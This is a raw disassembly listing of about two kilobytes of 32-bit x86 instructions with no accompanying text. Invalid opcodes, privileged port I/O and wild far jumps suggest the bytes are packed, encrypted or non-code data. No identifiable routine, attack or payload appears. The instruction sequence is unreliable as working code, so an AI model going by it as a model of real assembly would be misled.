  427dd7:	shl    DWORD PTR [ebp+0x4e],0x29
  427ddb:	in     eax,0x36
  427ddd:	ins    DWORD PTR es:[edi],dx
  427dde:	jnp    0x427d97
  427de0:	xchg   ecx,eax
  427de1:	jp     0x427dc7
  427de3:	push   ss
  427de4:	ret    0x1107
  427de7:	xlat   BYTE PTR ds:[ebx]
  427de8:	ret    
  427de9:	mov    cl,0xdf
  427deb:	das    
  427dec:	mov    DWORD PTR [ebx+ecx*8],0x5afbca
  427df3:	mov    esi,0x43b4b054
  427df8:	sbb    DWORD PTR [ebx+0x31d4f01f],ecx
  427dfe:	mov    ds:0x8d44d3fd,al
  427e03:	loop   0x427d8d
  427e05:	inc    edi
  427e06:	mov    ebx,0x5ba55b5b
  427e0b:	mov    edi,esi
  427e0d:	sub    DWORD PTR [edi],eax
  427e0f:	pop    edx
  427e10:	sbb    eax,0xa4908a40
  427e15:	cld    
  427e16:	mov    eax,0xf11e518b
  427e1b:	stc    
  427e1c:	rol    BYTE PTR [eax+eiz*8],1
  427e1f:	loop   0x427e49
  427e21:	cmp    dl,ah
  427e23:	push   ebp
  427e24:	and    ebp,ebp
  427e26:	in     eax,dx
  427e27:	jecxz  0x427e59
  427e29:	xor    al,0xdd
  427e2b:	(bad)  
  427e2c:	in     eax,dx
  427e2d:	add    ch,bl
  427e2f:	add    BYTE PTR [ebx+0x138cac73],al
  427e35:	(bad)  
  427e36:	(bad)  
  427e37:	fwait
  427e38:	sbb    bh,BYTE PTR [edi]
  427e3a:	sbb    BYTE PTR [edi],0xd0
  427e3d:	push   es
  427e3e:	jnp    0x427e66
  427e40:	inc    ecx
  427e41:	and    al,0x96
  427e43:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  427e44:	out    dx,al
  427e45:	ret    
  427e46:	retf   
  427e47:	inc    eax
  427e48:	dec    esi
  427e49:	push   esi
  427e4a:	test   DWORD PTR [edi-0x4d196508],0xf8dfba6b
  427e54:	inc    BYTE PTR [ecx+0x51]
  427e57:	loop   0x427e12
  427e59:	adc    ch,bh
  427e5b:	not    BYTE PTR [esi+0x77]
  427e5e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  427e5f:	popa   
  427e60:	cmp    BYTE PTR [esi],al
  427e62:	retf   0x98ab
  427e65:	mov    ch,0x92
  427e67:	cmc    
  427e68:	out    0xd0,eax
  427e6a:	sbb    eax,0x7899fd69
  427e6f:	jne    0x427e54
  427e71:	adc    edi,DWORD PTR [esi+ebx*4]
  427e74:	neg    BYTE PTR [edi]
  427e76:	mov    al,0x60
  427e78:	pop    esp
  427e79:	aaa    
  427e7a:	jne    0x427e56
  427e7c:	and    BYTE PTR [ecx],0xf0
  427e7f:	scas   eax,DWORD PTR es:[edi]
  427e80:	adc    esp,DWORD PTR [ecx-0x7736bd35]
  427e86:	(bad)  
  427e87:	pushf  
  427e88:	xchg   ebx,eax
  427e89:	sub    ah,BYTE PTR [ebx-0x11]
  427e8c:	inc    ecx
  427e8d:	push   esi
  427e8e:	pop    es
  427e8f:	xchg   edx,eax
  427e90:	dec    ebx
  427e91:	adc    al,0xa
  427e93:	test   eax,0xa6d215e2
  427e98:	scas   al,BYTE PTR es:[edi]
  427e99:	enter  0x5086,0xc4
  427e9d:	stos   BYTE PTR es:[edi],al
  427e9e:	out    0x63,eax
  427ea0:	inc    ebx
  427ea1:	adc    eax,DWORD PTR [esi-0x71fb8ad3]
  427ea7:	dec    eax
  427ea8:	push   ds
  427ea9:	adc    dl,BYTE PTR [esi+0x4ded7d0a]
  427eaf:	dec    esi
  427eb0:	int3   
  427eb1:	mov    cl,bl
  427eb3:	adc    DWORD PTR [ebx+0x72e43ae0],edi
  427eb9:	ins    BYTE PTR es:[edi],dx
  427eba:	mov    cl,0xfc
  427ebc:	fisttp WORD PTR [ebx-0x6b]
  427ebf:	cmc    
  427ec0:	push   0x39ec0c68
  427ec5:	ret    0x2f24
  427ec8:	fnstenv [ebp+0x42]
  427ecb:	cli    
  427ecc:	fst    QWORD PTR [esi-0x3000f0]
  427ed2:	xchg   ecx,eax
  427ed3:	xchg   ch,dl
  427ed5:	cmp    DWORD PTR [edx-0x79df9b9e],esi
  427edb:	rcl    ecx,0xef
  427ede:	adc    al,0xb0
  427ee0:	mov    cl,0x38
  427ee2:	sahf   
  427ee3:	xor    ecx,DWORD PTR [esi+eax*4-0x382d8b71]
  427eea:	xor    BYTE PTR [ecx],dl
  427eec:	push   ecx
  427eed:	and    edx,ecx
  427eef:	call   0xea49:0x12f6eea2
  427ef6:	adc    DWORD PTR fs:[ecx],0xffffffb2
  427efa:	sub    BYTE PTR [edx],ah
  427efc:	mov    bl,0x2b
  427efe:	popa   
  427eff:	stc    
  427f00:	into   
  427f01:	jns    0x427e84
  427f03:	sub    DWORD PTR [eax],edi
  427f05:	lea    edx,[edx+0x6aad1667]
  427f0b:	adc    BYTE PTR [ebx],dh
  427f0d:	or     DWORD PTR [edx-0x55],ebx
  427f10:	addr16 rcl bl,1
  427f13:	loope  0x427f19
  427f15:	add    eax,DWORD PTR [edi-0x50]
  427f18:	sbb    edx,esi
  427f1a:	sbb    eax,edx
  427f1c:	ds xor eax,ebx
  427f1f:	dec    esp
  427f20:	xor    dl,ah
  427f22:	sahf   
  427f23:	jl     0x427eba
  427f25:	mov    dh,0xf6
  427f27:	sub    ebp,DWORD PTR [edx+0x14207af5]
  427f2d:	mov    cl,0xc3
  427f2f:	mov    ebp,0x3bc3e608
  427f34:	sar    BYTE PTR [esi],0xa9
  427f37:	mov    al,ds:0xbed290de
  427f3c:	in     al,dx
  427f3d:	push   ss
  427f3e:	imul   ebx,DWORD PTR [edx+0x33],0xffffffcf
  427f42:	jbe    0x427edb
  427f44:	xchg   esp,eax
  427f45:	mov    ebx,0xa08754aa
  427f4a:	shl    DWORD PTR [ebp-0x6e],0x2a
  427f4e:	in     eax,dx
  427f4f:	jmp    0xa788:0xa6ea3087
  427f56:	push   edx
  427f57:	jmp    0x12ac3606
  427f5c:	pop    esp
  427f5d:	inc    esi
  427f5e:	mov    ds:0xc004e871,al
  427f63:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  427f64:	clc    
  427f65:	pop    eax
  427f66:	mov    esi,DWORD PTR [ebx]
  427f68:	cmp    al,0xa2
  427f6a:	popa   
  427f6b:	leave  
  427f6c:	jno    0x427f57
  427f6e:	mov    edi,0xe7e311cb
  427f73:	sbb    al,0x68
  427f75:	stos   DWORD PTR es:[edi],eax
  427f76:	stos   BYTE PTR es:[edi],al
  427f77:	push   esi
  427f78:	dec    edx
  427f79:	in     eax,dx
  427f7a:	scas   eax,DWORD PTR es:[edi]
  427f7b:	xlat   BYTE PTR ds:[ebx]
  427f7c:	mov    ah,0xc3
  427f7e:	pusha  
  427f7f:	mov    dh,0xd0
  427f81:	cmp    al,0x23
  427f83:	mov    ebp,0x73dab2ee
  427f88:	or     eax,0xc75c86eb
  427f8d:	pop    ebx
  427f8e:	mov    bl,0xed
  427f90:	jnp    0x427f9b
  427f92:	or     eax,0xcd7b26f2
  427f97:	or     esi,ebx
  427f99:	jp     0x427f65
  427f9b:	pop    ss
  427f9c:	cld    
  427f9d:	push   edi
  427f9e:	aam    0xe0
  427fa0:	mov    esi,0x5e6c1446
  427fa5:	xor    DWORD PTR [edi-0x71],ebx
  427fa8:	pop    eax
  427fa9:	jecxz  0x427f31
  427fab:	scas   eax,DWORD PTR es:[edi]
  427fac:	out    dx,eax
  427fad:	loope  0x427f56
  427faf:	mov    ds:0x46200fe0,eax
  427fb4:	dec    ecx
  427fb5:	jp     0x427f3a
  427fb7:	inc    ecx
  427fb8:	adc    al,0x5c
  427fba:	xchg   esi,eax
  427fbb:	test   ebx,ebp
  427fbd:	aam    0x69
  427fbf:	sbb    eax,DWORD PTR ds:0x89fa66ee
  427fc5:	jmp    0x88151844
  427fca:	aas    
  427fcb:	std    
  427fcc:	add    al,0x18
  427fce:	scas   eax,DWORD PTR es:[edi]
  427fcf:	int3   
  427fd0:	out    0xda,eax
  427fd2:	pusha  
  427fd3:	loopne 0x427f5d
  427fd5:	test   al,0xd7
  427fd7:	xor    ebx,DWORD PTR [edi]
  427fd9:	scas   eax,DWORD PTR es:[edi]
  427fda:	imul   eax,DWORD PTR [ebp+0x54],0xa4292228
  427fe1:	jno    0x427fee
  427fe3:	aam    0x3e
  427fe5:	les    ebp,FWORD PTR [edx+0x4e]
  427fe8:	jo     0x427fbb
  427fea:	imul   ebp,DWORD PTR [esi]
  427fed:	push   ds
  427fee:	xchg   ebx,eax
  427fef:	sbb    ch,dh
  427ff1:	pop    esp
  427ff2:	in     eax,0x6f
  427ff4:	femms  
  427ff6:	cld    
  427ff7:	jne    0x428015
  427ff9:	not    BYTE PTR [ebx-0x3e]
  427ffc:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  427ffd:	jae    0x428061
  427fff:	mov    eax,ds:0x32dc2b6d
  428004:	push   esi
  428005:	dec    ebx
  428006:	and    al,0xb1
  428008:	jne    0x427fc8
  42800a:	dec    esp
  42800b:	sbb    DWORD PTR [esi],esi
  42800d:	clc    
  42800e:	into   
  42800f:	mov    al,0x95
  428011:	dec    ebx
  428012:	mov    al,BYTE PTR [edx+0x63]
  428015:	sub    eax,0xd7731167
  42801a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42801b:	adc    esp,ecx
  42801d:	cld    
  42801e:	(bad)
  428021:	outs   dx,DWORD PTR ds:[esi]
  428022:	xor    bh,BYTE PTR [edx+eiz*2-0x401ae4f7]
  428029:	iret   
  42802a:	push   si
  42802c:	in     eax,0xdb
  42802e:	bound  ecx,QWORD PTR [ebp+0x77112908]
  428034:	or     DWORD PTR [esi],esi
  428036:	cdq    
  428037:	push   cs
  428038:	cdq    
  428039:	xchg   edx,eax
  42803a:	or     al,0xd6
  42803c:	das    
  42803d:	std    
  42803e:	iret   
  42803f:	cmp    BYTE PTR ds:0xf6b42b52,dh
  428045:	inc    edx
  428046:	test   DWORD PTR [edi-0x31],eax
  428049:	fcomp  DWORD PTR [edx]
  42804b:	xlat   BYTE PTR ds:[ebx]
  42804c:	push   edi
  42804d:	das    
  42804e:	push   ss
  42804f:	call   0x1f505f57
  428054:	sub    ch,BYTE PTR [esi]
  428056:	test   DWORD PTR [eax-0xa],edi
  428059:	jecxz  0x428062
  42805b:	or     al,0x87
  42805d:	xor    BYTE PTR [ebp+0x437955f4],dl
  428063:	shl    BYTE PTR [eax+esi*4-0x72c35d2a],0x9a
  42806b:	or     eax,0x8e173904
  428070:	ficomp DWORD PTR [edx+edx*4+0x43]
  428074:	out    0x5e,eax
  428076:	push   0xf09f1f7e
  42807b:	mov    bh,0x1d
  42807d:	dec    edx
  42807e:	fdiv   DWORD PTR [ebp-0x1]
  428081:	in     al,0x8
  428083:	xchg   DWORD PTR [edx+edx*2+0x6ec11911],edx
  42808a:	pop    esi
  42808b:	call   0xda44f11a
  428090:	cmp    bl,dh
  428092:	(bad)  
  428093:	out    dx,al
  428094:	push   ebp
  428095:	bound  eax,QWORD PTR [ecx-0x33632347]
  42809b:	and    al,0x63
  42809d:	loopne 0x4280ce
  42809f:	pop    edx
  4280a0:	jge    0x4280b1
  4280a2:	popf   
  4280a3:	icebp  
  4280a4:	fidiv  WORD PTR [esi]
  4280a6:	push   eax
  4280a7:	call   ebp
  4280a9:	scas   eax,DWORD PTR es:[edi]
  4280aa:	test   eax,0xc33bcd24
  4280af:	push   0xb11066c1
  4280b4:	sub    esp,DWORD PTR ds:0x1f90b26b
  4280ba:	imul   edi,DWORD PTR [eax+0x7a],0x6b
  4280be:	les    esp,FWORD PTR ds:0x98e96058
  4280c4:	pushf  
  4280c5:	jnp    0x428103
  4280c7:	fidivr DWORD PTR [esi-0xacc60f2]
  4280cd:	and    dl,ah
  4280cf:	dec    esp
  4280d0:	add    dh,cl
  4280d2:	mov    eax,0xf3b587e
  4280d7:	xchg   edx,eax
  4280d8:	rcl    BYTE PTR [edx+0x4840e9],cl
  4280de:	add    BYTE PTR [eax],al
  4280e0:	add    BYTE PTR [eax],al
  4280e2:	(bad)  
  4280e3:	movs   DWORD PTR es:[di],DWORD PTR ds:[si]
  4280e5:	push   eax
  4280e6:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4280e7:	shl    bh,cl
  4280e9:	div    DWORD PTR [ebx-0x6bd89742]
  4280ef:	bound  esp,QWORD PTR [edx]
  4280f1:	and    DWORD PTR [edx-0x8],edi
  4280f4:	add    DWORD PTR [eax],eax
  4280f6:	repz add al,0x0
  4280f9:	add    al,ah
  4280fb:	popf   
  4280fc:	add    DWORD PTR [eax+0x43a93efa],esp
  428102:	shl    DWORD PTR [edi-0x4ab2a70e],0xa
  428109:	neg    DWORD PTR [eax-0x66]
  42810c:	pop    edi
  42810d:	das    
  42810e:	lock in eax,0xc0
  428111:	daa    
  428112:	jae    0x428159
  428114:	arpl   WORD PTR ds:0x96c2065d,dx
  42811a:	cli    
  42811b:	inc    edx
  42811c:	retf   
  42811d:	das    
  42811e:	test   DWORD PTR [edx-0xc],ebp
  428121:	xor    BYTE PTR [ecx],0x5b
  428124:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  428125:	in     eax,0xd5
  428127:	mov    bh,0x27
  428129:	aas    
  42812a:	adc    al,0x42
  42812c:	daa    
  42812d:	inc    ecx
  42812e:	fstp   DWORD PTR [ebx-0x78]
  428131:	lods   al,BYTE PTR ds:[esi]
  428132:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  428133:	and    DWORD PTR [ebx],eax
  428135:	in     al,0xc0
  428137:	jns    0x42815f
  428139:	add    esp,DWORD PTR [edx-0x712f4e50]
  42813f:	inc    eax
  428140:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  428141:	add    DWORD PTR [eax-0x74],edx
  428144:	sub    eax,0xf6ecba5a
  428149:	sbb    al,0x76
  42814b:	lea    ebp,[edi+ecx*1+0x5bc76b03]
  428152:	loopne 0x428122
  428154:	push   es
  428155:	pop    es
  428156:	aad    0x7e
  428158:	mov    ds:0xc264b63,al
  42815d:	adc    bl,BYTE PTR [ebp-0x35]
  428160:	shl    BYTE PTR [edx+0x70],cl
  428163:	add    al,0xa2
  428165:	cmp    ebx,eax
  428167:	sub    al,0xe9
  428169:	test   DWORD PTR [ecx],esi
  42816b:	mov    ds:0x36a9ddf6,eax
  428170:	pop    esi
  428171:	push   0x91ec1d6f
  428176:	std    
  428177:	and    eax,0x4b4c2800
  42817c:	xor    al,0x7f
  42817e:	mov    bh,0x41
  428180:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  428181:	cli    
  428182:	or     eax,0x2eadf082
  428187:	or     BYTE PTR [edi],cl
  428189:	int3   
  42818a:	push   esi
  42818b:	sbb    eax,0x2b956c22
  428190:	mov    WORD PTR [ebx],cs
  428192:	mov    al,ds:0xbf55b503
  428198:	dec    ecx
  428199:	leave  
  42819a:	dec    esp
  42819b:	mov    edx,0x7e1fa45f
  4281a0:	into   
  4281a1:	lock jmp 0xecf4:0x9cce79f4
  4281a9:	ins    BYTE PTR es:[edi],dx
  4281aa:	jbe    0x4281ec
  4281ac:	ret    0x9883
  4281af:	pop    ebx
  4281b0:	cmp    ch,dh
  4281b2:	lea    esp,[ebx-0x6ef3d432]
  4281b8:	repnz imul BYTE PTR [ebx]
  4281bb:	mov    dl,0x21
  4281bd:	in     al,0x9b
  4281bf:	test   al,0x81
  4281c1:	mov    edx,0x7387c3c
  4281c6:	xchg   ebp,eax
  4281c7:	xlat   BYTE PTR ds:[ebx]
  4281c8:	inc    esi
  4281c9:	in     al,0x9b
  4281cb:	fdiv   QWORD PTR [edi]
  4281cd:	jnp    0x42821b
  4281cf:	dec    esi
  4281d0:	xor    DWORD PTR [edx],esi
  4281d2:	ins    BYTE PTR es:[edi],dx
  4281d3:	adc    BYTE PTR [ebx-0x5d],cl
  4281d6:	das    
  4281d7:	pop    ebx
  4281d8:	add    al,0xd0
  4281da:	pop    ds
  4281db:	mov    ebp,0x57b9b3d1
  4281e0:	adc    dl,BYTE PTR [edx-0x65b8ef4]
  4281e6:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4281e7:	ss (bad) 
  4281e9:	push   esi
  4281ea:	sar    DWORD PTR [ebx+edx*4],cl
  4281ed:	mov    bh,0x91
  4281ef:	adc    al,0x88
  4281f1:	ficomp DWORD PTR [edx-0x13d3d2d3]
  4281f7:	and    esi,esp
  4281f9:	cdq    
  4281fa:	repz mov ch,0x96
  4281fd:	sbb    BYTE PTR [eax-0x7e348764],dl
  428203:	out    dx,eax
  428204:	adc    al,0x33
  428206:	sub    eax,0xa3a40dca
  42820b:	clc    
  42820c:	fisubr WORD PTR ds:0xe191f3dd
  428212:	int    0x61
  428214:	cld    
  428215:	inc    edi
  428216:	or     esi,eax
  428218:	nop
  428219:	cmp    al,0x51
  42821b:	cmp    cl,al
  42821d:	push   esi
  42821e:	or     eax,0x8206afce
  428223:	arpl   WORD PTR [ebx],bx
  428225:	jne    0x4281ac
  428227:	repz call 0xc226:0xdd8aeb2f
  42822f:	sahf   
  428230:	test   bh,dh
  428232:	sti    
  428233:	daa    
  428234:	outs   dx,BYTE PTR ds:[esi]
  428235:	sbb    bl,BYTE PTR [esi-0x5a]
  428238:	mov    di,0xd19f
  42823c:	mov    ah,BYTE PTR [eax]
  42823e:	jmp    0xb81d82ab
  428243:	addr16 mov eax,0xd51e0c0
  428249:	ins    DWORD PTR es:[edi],dx
  42824a:	into   
  42824b:	push   esi
  42824c:	stos   DWORD PTR es:[edi],eax
  42824d:	inc    esi
  42824e:	push   esi
  42824f:	xor    BYTE PTR [edi+ebx*8+0x4c],bl
  428253:	leave  
  428254:	mov    eax,0xea3ff27c
  428259:	lods   eax,DWORD PTR ds:[esi]
  42825a:	and    BYTE PTR [edx+0xf21e0b2],ch
  428260:	cmp    al,0x9e
  428262:	out    0x44,eax
  428264:	pand   mm0,mm1
  428267:	sbb    DWORD PTR [ebx+eiz*8],eax
  42826a:	xor    al,0xf9
  42826c:	scas   al,BYTE PTR es:[edi]
  42826d:	mov    ds:0xdb1a9140,eax
  428272:	cmc    
  428273:	stos   DWORD PTR es:[edi],eax
  428274:	cmp    eax,0xc3458d7b
  428279:	out    dx,eax
  42827a:	fcomp  DWORD PTR [ebx-0x414e79ff]
  428280:	dec    edx
  428281:	push   ecx
  428282:	ja     0x428243
  428284:	fbld   TBYTE PTR [eax+0x25190fd]
  42828a:	in     al,dx
  42828b:	sar    bh,1
  42828d:	aas    
  42828e:	clc    
  42828f:	or     DWORD PTR [edx+0x766107c2],eax
  428295:	loopne 0x428233
  428297:	cmp    ch,BYTE PTR [edi-0x26]
  42829a:	jo     0x428271
  42829c:	mov    ds:0xf39a5d77,eax
  4282a1:	bnd jmp 0xc89a4a61
  4282a7:	push   es
  4282a8:	jecxz  0x4282cf
  4282aa:	cli    
  4282ab:	retf   0xcb32
  4282ae:	xchg   esp,eax
  4282af:	ins    DWORD PTR es:[edi],dx
  4282b0:	test   ch,ah
  4282b2:	cmp    DWORD PTR [edi+0x6e],ecx
  4282b5:	pop    ecx
  4282b6:	mov    ds:0x1be450c7,al
  4282bb:	(bad)  
  4282bc:	outs   dx,BYTE PTR ds:[esi]
  4282bd:	mov    ebx,fs
  4282bf:	jl     0x4282b8
  4282c1:	push   esi
  4282c2:	mov    al,ds:0x74112d36
  4282c7:	xchg   dh,ch
  4282c9:	jne    0x4282e5
  4282cb:	hlt    
  4282cc:	adc    eax,DWORD PTR [eax-0x67]
  4282cf:	(bad)  
  4282d1:	pop    esp
  4282d2:	fild   QWORD PTR [esi]
  4282d4:	adc    al,BYTE PTR [edi]
  4282d6:	jp     0x42827e
  4282d8:	rcl    DWORD PTR [eax+0x21],0xf9
  4282dc:	mov    al,0xd4
  4282de:	aam    0xf0
  4282e0:	fxch   st(3)
  4282e2:	xor    eax,0xfd74f21a
  4282e7:	call   FWORD PTR [ebx-0xea19c04]
  4282ed:	(bad)  
  4282ee:	jbe    0x428320
  4282f0:	pop    ss
  4282f1:	adc    al,0x5a
  4282f3:	xor    al,BYTE PTR [esi]
  4282f5:	mov    ebp,ebx
  4282f7:	jecxz  0x428316
  4282f9:	mov    ds:0x633bfca5,al
  4282fe:	das    
  4282ff:	nop
  428300:	loopne 0x428339
  428302:	test   ebx,ebx
  428304:	jne    0x428343
  428306:	sub    esp,edx
  428308:	test   bl,bl
  42830a:	lds    ebp,FWORD PTR ds:0xf44118f3
  428310:	sbb    DWORD PTR [ebp-0x1d58a1f3],0x92a334f0
  42831a:	pop    edi
  42831b:	in     eax,0x21
  42831d:	mov    WORD PTR [esi],cs
  42831f:	xor    DWORD PTR [ebp+0x1fdc4670],ebx
  428325:	pop    edx
  428326:	adc    BYTE PTR [edi],ch
  428328:	cmp    al,BYTE PTR [edx]
  42832a:	(bad)  
  42832b:	mov    edi,0x96d51fc7
  428330:	fild   WORD PTR [edx]
  428332:	push   cs
  428333:	shl    DWORD PTR [esi-0x36],cl
  428336:	sub    DWORD PTR [ebp+ecx*2+0x3c],esp
  42833a:	mov    bl,0x44
  42833c:	int    0x9a
  42833e:	add    BYTE PTR [ecx],cl
  428340:	adc    BYTE PTR [esi+0x10],0x29
  428344:	fsub   DWORD PTR [edi+0x3b]
  428347:	mov    ds:0x15e00237,al
  42834c:	test   DWORD PTR [ecx+0x52530b93],edx
  428352:	and    eax,DWORD PTR [edi+0x67fca7be]
  428358:	iret   
  428359:	popa   
  42835a:	retf   
  42835b:	and    al,0xb4
  42835d:	cld    
  42835e:	hlt    
  42835f:	xor    al,0xb3
  428361:	xor    DWORD PTR [ebp+0x62],edi
  428364:	rol    DWORD PTR [edi],1
  428366:	add    eax,0x2ee2a470
  42836b:	aas    
  42836c:	call   0x45a1:0x474d7eb1
  428373:	xor    esp,DWORD PTR [edi-0x59e23f36]
  428379:	and    DWORD PTR [esi],esi
  42837b:	adc    DWORD PTR [eax-0x5c507e1],eax
  428381:	daa    
  428382:	cmp    DWORD PTR [edx],0xffffffd9
  428385:	(bad)  
  428386:	dec    ecx
  428387:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  428388:	stos   BYTE PTR es:[edi],al
  428389:	sub    al,0x85
  42838b:	bswap  eax
  42838d:	xlat   BYTE PTR ds:[ebx]
  42838e:	jbe    0x4283c2
  428390:	imul   esp,DWORD PTR [edi+0x1c],0x23
  428394:	sahf   
  428395:	push   es
  428396:	retf   
  428397:	push   ebp
  428398:	pop    edi
  428399:	or     esp,eax
  42839b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42839c:	dec    edx
  42839d:	sub    al,0x76
  42839f:	scas   al,BYTE PTR es:[edi]
  4283a0:	jg     0x428362
  4283a2:	adc    ebx,edx
  4283a4:	push   ss
  4283a5:	adc    al,BYTE PTR [edi]
  4283a7:	mov    al,ds:0xdb89e976
  4283ac:	ficom  WORD PTR [edi+0x7b]
  4283af:	call   0xbcbc75fd
  4283b4:	dec    ebp
  4283b5:	jge    0x428387
  4283b7:	cmp    al,0x7f
  4283b9:	out    0x4f,eax
  4283bb:	jns    0x428399
  4283bd:	ror    DWORD PTR [edx],0x90
  4283c0:	mov    esp,0x9dc6d3f1
  4283c5:	fisub  WORD PTR [ecx+edi*4]
  4283c8:	hlt    
  4283c9:	mov    esp,DWORD PTR [edi-0xf]
  4283cc:	mov    BYTE PTR [esi],bh
  4283ce:	and    esp,esi
  4283d0:	test   al,0xad
  4283d2:	aas    
  4283d3:	ret    0xf059
  4283d6:	inc    ecx
  4283d7:	add    ebp,ebp
  4283d9:	push   ebx
  4283da:	ror    DWORD PTR [eax+0x36abe12e],0xed
  4283e1:	popa   
  4283e2:	mov    bh,0xab
  4283e4:	ds add al,0x1f
  4283e7:	cwde   
  4283e8:	pushf  
  4283e9:	fwait
  4283ea:	inc    ebp
  4283eb:	jne    0x4283bb
  4283ed:	push   esp
  4283ee:	(bad)  [ecx+ebx*8-0x62]
  4283f2:	fwait
  4283f3:	dec    ecx
  4283f4:	mov    ch,BYTE PTR [ecx+0x7fd18433]
  4283fa:	sbb    ecx,edx
  4283fc:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4283fd:	cmp    al,0x99
  4283ff:	jg     0x4283d8
  428401:	shl    BYTE PTR [ebp+0x2747c002],1
  428407:	nop
  428408:	repz pushf 
  42840a:	out    dx,eax
  42840b:	push   ss
  42840c:	aam    0x1d
  42840e:	push   ecx
  42840f:	es daa 
  428411:	mov    ah,0xca
  428413:	adc    al,0x1c
  428415:	fdivr  DWORD PTR [ebp-0x70bec0d5]
  42841b:	mov    eax,0x3f823519
  428420:	mov    esi,0x3304f526
  428425:	ds jp  0x428444
  428428:	sub    BYTE PTR [ebp-0x12268abb],ah
  42842e:	sub    DWORD PTR [edi],edi
  428430:	sbb    eax,0xdabd8a21
  428435:	dec    esi
  428436:	inc    eax
  428437:	mov    eax,ds:0x9964792d
  42843c:	icebp  
  42843d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42843e:	test   BYTE PTR [ebx],cl
  428440:	popf   
  428441:	pop    esi
  428442:	pop    eax
  428443:	xor    DWORD PTR [edi-0x19f83827],eax
  428449:	ins    DWORD PTR es:[edi],dx
  42844a:	mov    dl,ah
  42844c:	ret    0x1026
  42844f:	inc    esi
  428450:	push   ss
  428451:	sbb    al,0x29
  428453:	xor    al,0x82
  428455:	mov    eax,ds:0x471ea2b5
  42845a:	stc    
  42845b:	sub    al,0xe7
  42845d:	xchg   esi,eax
  42845e:	and    DWORD PTR [ebx+0x16986b5e],0x5faa64ab
  428468:	add    BYTE PTR [edi-0x2d458a67],0xa4
  42846f:	push   eax
  428470:	add    BYTE PTR [edi],cl
  428472:	and    ebx,edi
  428474:	sub    DWORD PTR [ebx-0x4ead3e67],esi
  42847a:	mov    edx,0x1bfe3711
  42847f:	and    esp,DWORD PTR [edi+0x6b9be35e]
  428485:	test   al,0x35
  428487:	pop    eax
  428488:	xor    eax,0x37a8f9b5
  42848d:	sbb    ebx,DWORD PTR [edi+eiz*4]
  428490:	leave  
  428491:	xor    DWORD PTR [esi],ebp
  428493:	xor    al,0xa8
  428495:	loope  0x428429
  428497:	mov    ds:0x363c0c17,eax
  42849c:	sbb    DWORD PTR [edi+ecx*8+0x5d],0x1835a623
  4284a4:	jle    0x428499
  4284a6:	outs   dx,BYTE PTR ds:[esi]
  4284a7:	xor    esi,ecx
  4284a9:	jge    0x42850c
  4284ab:	in     eax,dx
  4284ac:	or     edx,DWORD PTR [esi-0x7]
  4284af:	lods   eax,DWORD PTR ds:[esi]
  4284b0:	test   eax,0x715ea567
  4284b5:	retf   0xb653
  4284b8:	dec    esp
  4284b9:	(bad)  
  4284ba:	mov    gs,WORD PTR [edi-0x33]
  4284bd:	test   BYTE PTR [edx+edi*1+0x58a96c30],0xfd
  4284c5:	xor    ah,cl
  4284c7:	xor    edi,edx
  4284c9:	mov    eax,ds:0x74973c41
  4284ce:	cmp    al,0x96
  4284d0:	out    0x16,al
  4284d2:	pop    eax
  4284d3:	(bad)  
  4284d5:	scas   al,BYTE PTR es:[edi]
  4284d6:	jno    0x4284df
  4284d8:	stc    
  4284d9:	mov    ss:0xbbf2dba5,eax
  4284df:	(bad)  
  4284e0:	dec    ecx
  4284e1:	(bad)  
  4284e2:	mov    edx,0x2c02a7d6
  4284e7:	ror    DWORD PTR [esi-0x5a],0xd0
  4284eb:	and    al,0xa0
  4284ed:	and    eax,0xb5b2b6af
  4284f2:	add    edi,DWORD PTR [ecx]
  4284f4:	pop    edi
  4284f5:	sbb    DWORD PTR [ecx],ebx
  4284f7:	inc    ecx
  4284f8:	push   eax
  4284f9:	push   ds
  4284fa:	fisub  WORD PTR [esi+0x207d4f3f]
  428500:	mov    ebp,ebp
  428502:	mov    ds:0x60e5228a,eax
  428507:	mov    DWORD PTR [edx],esi
  428509:	mov    BYTE PTR [edi-0x41a5b518],ch
  42850f:	sbb    eax,0x91446d7
  428514:	adc    bl,BYTE PTR [ecx]
  428516:	push   0x43
  428518:	pop    eax
  428519:	add    bl,al
  42851b:	icebp  
  42851c:	mov    dl,0x85
  42851e:	dec    ecx
  42851f:	dec    ebx
  428520:	or     DWORD PTR [edi+0x294d0c5e],esp
  428526:	push   eax
  428527:	enter  0x3edc,0x9
  42852b:	cmp    DWORD PTR [ecx+0x1b6d28c2],ebp
  428531:	mov    BYTE PTR [ecx+0x6b],ah
  428534:	xor    DWORD PTR [ecx],esi
  428536:	sbb    al,0x20
  428538:	pop    ss
  428539:	aaa    
  42853a:	and    eax,DWORD PTR [edi+esi*8-0x7a]
  42853e:	sub    DWORD PTR [eax+0x7f9c158a],edx
  428544:	in     al,dx
  428545:	in     al,0xa8
  428547:	jge    0x4284fa
  428549:	pop    ebp
  42854a:	ss cmp al,0xee
  42854d:	adc    esi,DWORD PTR [edx]
  42854f:	hlt    
  428550:	jge    0x428563
  428552:	jge    0x428553
  428554:	mov    dl,0x6d
  428556:	ror    BYTE PTR [eax-0x10],0x35
  42855a:	test   al,0x12
  42855c:	and    ebx,DWORD PTR [edx-0x11]
  42855f:	fsubr  st,st(7)
  428561:	and    al,0x19
  428563:	mov    esi,DWORD PTR [ebx+0x2ea29e2d]
  428569:	mov    eax,0x38c5d1a4
  42856e:	mov    bl,0x83
  428570:	pop    ds
  428571:	out    0x7e,eax
  428573:	xor    edx,ecx
  428575:	cmp    edx,DWORD PTR ds:0x8c10d098
  42857b:	sahf   
  42857c:	gs jae 0x428548
  42857f:	in     eax,dx
  428580:	xchg   esp,eax
  428581:	cmp    DWORD PTR cs:[ebp+0x12],eax
